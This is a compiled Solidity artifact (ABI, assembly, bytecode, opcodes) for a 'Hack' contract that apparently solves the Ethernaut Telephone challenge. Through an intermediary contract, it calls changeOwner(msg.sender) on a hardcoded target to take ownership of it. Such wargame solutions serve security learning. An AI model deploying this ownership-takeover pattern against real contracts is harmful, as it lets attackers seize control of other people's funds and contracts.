{
	"security/etheranut/Telephone/Telephone.sol": {
		"Hack": {
			"abi": [
				{
					"inputs": [],
					"name": "getOwner",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "hack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"security/etheranut/Telephone/Telephone.sol\":313:601  contract Hack {... */\n  mstore(0x40, 0x80)\n    /* \"security/etheranut/Telephone/Telephone.sol\":351:393  0x6694A3F539b98412752E3e2cdcA55db53Bc2DceE */\n  0x6694a3f539b98412752e3e2cdca55db53bc2dcee\n    /* \"security/etheranut/Telephone/Telephone.sol\":334:393  address target = 0x6694A3F539b98412752E3e2cdcA55db53Bc2DceE */\n  0x00\n  exp(0x0100, 0x00)\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"security/etheranut/Telephone/Telephone.sol\":425:431  target */\n  0x00\n  0x00\n  swap1\n  sload\n  swap1\n  0x0100\n  exp\n  swap1\n  div\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n    /* \"security/etheranut/Telephone/Telephone.sol\":400:432  Telephone tp = Telephone(target) */\n  0x01\n  exp(0x0100, 0x00)\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"security/etheranut/Telephone/Telephone.sol\":313:601  contract Hack {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"security/etheranut/Telephone/Telephone.sol\":313:601  contract Hack {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      revert(0x00, 0x00)\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x4de260a2\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x893d20e8\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      revert(0x00, 0x00)\n        /* \"security/etheranut/Telephone/Telephone.sol\":439:506  function hack() public{... */\n    tag_3:\n      tag_5\n      tag_6\n      jump\t// in\n    tag_5:\n      stop\n        /* \"security/etheranut/Telephone/Telephone.sol\":514:598  function getOwner() public view returns(address){... */\n    tag_4:\n      tag_7\n      tag_8\n      jump\t// in\n    tag_7:\n      mload(0x40)\n      tag_9\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"security/etheranut/Telephone/Telephone.sol\":439:506  function hack() public{... */\n    tag_6:\n        /* \"security/etheranut/Telephone/Telephone.sol\":472:474  tp */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"security/etheranut/Telephone/Telephone.sol\":472:486  tp.changeOwner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xa6f9dae1\n        /* \"security/etheranut/Telephone/Telephone.sol\":487:497  msg.sender */\n      caller\n        /* \"security/etheranut/Telephone/Telephone.sol\":472:498  tp.changeOwner(msg.sender) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_12\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_12:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_13\n      jumpi\n      revert(0x00, 0x00)\n    tag_13:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_15\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_15:\n      pop\n      pop\n      pop\n      pop\n        /* \"security/etheranut/Telephone/Telephone.sol\":439:506  function hack() public{... */\n      jump\t// out\n        /* \"security/etheranut/Telephone/Telephone.sol\":514:598  function getOwner() public view returns(address){... */\n    tag_8:\n        /* \"security/etheranut/Telephone/Telephone.sol\":554:561  address */\n      0x00\n        /* \"security/etheranut/Telephone/Telephone.sol\":580:582  tp */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"security/etheranut/Telephone/Telephone.sol\":580:588  tp.owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x8da5cb5b\n        /* \"security/etheranut/Telephone/Telephone.sol\":580:590  tp.owner() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_18\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_18:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_19\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_19:\n        /* \"security/etheranut/Telephone/Telephone.sol\":573:590  return tp.owner() */\n      swap1\n      pop\n        /* \"security/etheranut/Telephone/Telephone.sol\":514:598  function getOwner() public view returns(address){... */\n      swap1\n      jump\t// out\n        /* \"#utility.yul\":7:133   */\n    tag_21:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":84:126   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":77:82   */\n      dup3\n        /* \"#utility.yul\":73:127   */\n      and\n        /* \"#utility.yul\":62:127   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:133   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":139:235   */\n    tag_22:\n        /* \"#utility.yul\":176:183   */\n      0x00\n        /* \"#utility.yul\":205:229   */\n      tag_32\n        /* \"#utility.yul\":223:228   */\n      dup3\n        /* \"#utility.yul\":205:229   */\n      tag_21\n      jump\t// in\n    tag_32:\n        /* \"#utility.yul\":194:229   */\n      swap1\n      pop\n        /* \"#utility.yul\":139:235   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":241:359   */\n    tag_23:\n        /* \"#utility.yul\":328:352   */\n      tag_34\n        /* \"#utility.yul\":346:351   */\n      dup2\n        /* \"#utility.yul\":328:352   */\n      tag_22\n      jump\t// in\n    tag_34:\n        /* \"#utility.yul\":323:326   */\n      dup3\n        /* \"#utility.yul\":316:353   */\n      mstore\n        /* \"#utility.yul\":241:359   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":365:587   */\n    tag_10:\n        /* \"#utility.yul\":458:462   */\n      0x00\n        /* \"#utility.yul\":496:498   */\n      0x20\n        /* \"#utility.yul\":485:494   */\n      dup3\n        /* \"#utility.yul\":481:499   */\n      add\n        /* \"#utility.yul\":473:499   */\n      swap1\n      pop\n        /* \"#utility.yul\":509:580   */\n      tag_36\n        /* \"#utility.yul\":577:578   */\n      0x00\n        /* \"#utility.yul\":566:575   */\n      dup4\n        /* \"#utility.yul\":562:579   */\n      add\n        /* \"#utility.yul\":553:559   */\n      dup5\n        /* \"#utility.yul\":509:580   */\n      tag_23\n      jump\t// in\n    tag_36:\n        /* \"#utility.yul\":365:587   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":674:791   */\n    tag_25:\n        /* \"#utility.yul\":783:784   */\n      0x00\n        /* \"#utility.yul\":780:781   */\n      0x00\n        /* \"#utility.yul\":773:785   */\n      revert\n        /* \"#utility.yul\":920:1042   */\n    tag_27:\n        /* \"#utility.yul\":993:1017   */\n      tag_41\n        /* \"#utility.yul\":1011:1016   */\n      dup2\n        /* \"#utility.yul\":993:1017   */\n      tag_22\n      jump\t// in\n    tag_41:\n        /* \"#utility.yul\":986:991   */\n      dup2\n        /* \"#utility.yul\":983:1018   */\n      eq\n        /* \"#utility.yul\":973:1036   */\n      tag_42\n      jumpi\n        /* \"#utility.yul\":1032:1033   */\n      0x00\n        /* \"#utility.yul\":1029:1030   */\n      0x00\n        /* \"#utility.yul\":1022:1034   */\n      revert\n        /* \"#utility.yul\":973:1036   */\n    tag_42:\n        /* \"#utility.yul\":920:1042   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1048:1191   */\n    tag_28:\n        /* \"#utility.yul\":1105:1110   */\n      0x00\n        /* \"#utility.yul\":1136:1142   */\n      dup2\n        /* \"#utility.yul\":1130:1143   */\n      mload\n        /* \"#utility.yul\":1121:1143   */\n      swap1\n      pop\n        /* \"#utility.yul\":1152:1185   */\n      tag_44\n        /* \"#utility.yul\":1179:1184   */\n      dup2\n        /* \"#utility.yul\":1152:1185   */\n      tag_27\n      jump\t// in\n    tag_44:\n        /* \"#utility.yul\":1048:1191   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1197:1548   */\n    tag_20:\n        /* \"#utility.yul\":1267:1273   */\n      0x00\n        /* \"#utility.yul\":1316:1318   */\n      0x20\n        /* \"#utility.yul\":1304:1313   */\n      dup3\n        /* \"#utility.yul\":1295:1302   */\n      dup5\n        /* \"#utility.yul\":1291:1314   */\n      sub\n        /* \"#utility.yul\":1287:1319   */\n      slt\n        /* \"#utility.yul\":1284:1403   */\n      iszero\n      tag_46\n      jumpi\n        /* \"#utility.yul\":1322:1401   */\n      tag_47\n      tag_25\n      jump\t// in\n    tag_47:\n        /* \"#utility.yul\":1284:1403   */\n    tag_46:\n        /* \"#utility.yul\":1442:1443   */\n      0x00\n        /* \"#utility.yul\":1467:1531   */\n      tag_48\n        /* \"#utility.yul\":1523:1530   */\n      dup5\n        /* \"#utility.yul\":1514:1520   */\n      dup3\n        /* \"#utility.yul\":1503:1512   */\n      dup6\n        /* \"#utility.yul\":1499:1521   */\n      add\n        /* \"#utility.yul\":1467:1531   */\n      tag_28\n      jump\t// in\n    tag_48:\n        /* \"#utility.yul\":1457:1531   */\n      swap2\n      pop\n        /* \"#utility.yul\":1413:1541   */\n      pop\n        /* \"#utility.yul\":1197:1548   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220dc5fa35745fb83e3f98c3ead72c9ef92f52463055f9854c05e8226d23c52552c64736f6c634300081e0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "6080604052736694a3f539b98412752e3e2cdca55db53bc2dcee5f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801560c1575f5ffd5b50610264806100cf5f395ff3fe608060405234801561000f575f5ffd5b5060043610610034575f3560e01c80634de260a214610038578063893d20e814610042575b5f5ffd5b610040610060565b005b61004a6100e9565b60405161005791906101bc565b60405180910390f35b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a6f9dae1336040518263ffffffff1660e01b81526004016100ba91906101bc565b5f604051808303815f87803b1580156100d1575f5ffd5b505af11580156100e3573d5f5f3e3d5ffd5b50505050565b5f60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16638da5cb5b6040518163ffffffff1660e01b8152600401602060405180830381865afa158015610154573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101789190610203565b905090565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6101a68261017d565b9050919050565b6101b68161019c565b82525050565b5f6020820190506101cf5f8301846101ad565b92915050565b5f5ffd5b6101e28161019c565b81146101ec575f5ffd5b50565b5f815190506101fd816101d9565b92915050565b5f60208284031215610218576102176101d5565b5b5f610225848285016101ef565b9150509291505056fea2646970667358221220dc5fa35745fb83e3f98c3ead72c9ef92f52463055f9854c05e8226d23c52552c64736f6c634300081e0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH20 0x6694A3F539B98412752E3E2CDCA55DB53BC2DCEE PUSH0 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x1 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLVALUE DUP1 ISZERO PUSH1 0xC1 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x264 DUP1 PUSH2 0xCF PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x34 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x4DE260A2 EQ PUSH2 0x38 JUMPI DUP1 PUSH4 0x893D20E8 EQ PUSH2 0x42 JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x40 PUSH2 0x60 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x4A PUSH2 0xE9 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x57 SWAP2 SWAP1 PUSH2 0x1BC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xA6F9DAE1 CALLER PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xBA SWAP2 SWAP1 PUSH2 0x1BC JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xD1 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xE3 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH0 PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x8DA5CB5B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x154 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x178 SWAP2 SWAP1 PUSH2 0x203 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x1A6 DUP3 PUSH2 0x17D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1B6 DUP2 PUSH2 0x19C JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1CF PUSH0 DUP4 ADD DUP5 PUSH2 0x1AD JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x1E2 DUP2 PUSH2 0x19C JUMP JUMPDEST DUP2 EQ PUSH2 0x1EC JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x1FD DUP2 PUSH2 0x1D9 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x218 JUMPI PUSH2 0x217 PUSH2 0x1D5 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x225 DUP5 DUP3 DUP6 ADD PUSH2 0x1EF JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xDC PUSH0 LOG3 JUMPI GASLIMIT EXTSTATICCALL DUP4 CALLF 0xF98C RETURNDATACOPY 0xAD PUSH19 0xC9EF92F52463055F9854C05E8226D23C52552C PUSH5 0x736F6C6343 STOP ADDMOD 0x1E STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "122400",
						"executionCost": "50834",
						"totalCost": "173234"
					},
					"external": {
						"getOwner()": "infinite",
						"hack()": "infinite"
					}
				},
				"methodIdentifiers": {
					"getOwner()": "893d20e8",
					"hack()": "4de260a2"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 33,
						"contract": "security/etheranut/Telephone/Telephone.sol:Hack",
						"label": "target",
						"offset": 0,
						"slot": "0",
						"type": "t_address"
					},
					{
						"astId": 39,
						"contract": "security/etheranut/Telephone/Telephone.sol:Hack",
						"label": "tp",
						"offset": 0,
						"slot": "1",
						"type": "t_contract(Telephone)30"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_contract(Telephone)30": {
						"encoding": "inplace",
						"label": "contract Telephone",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}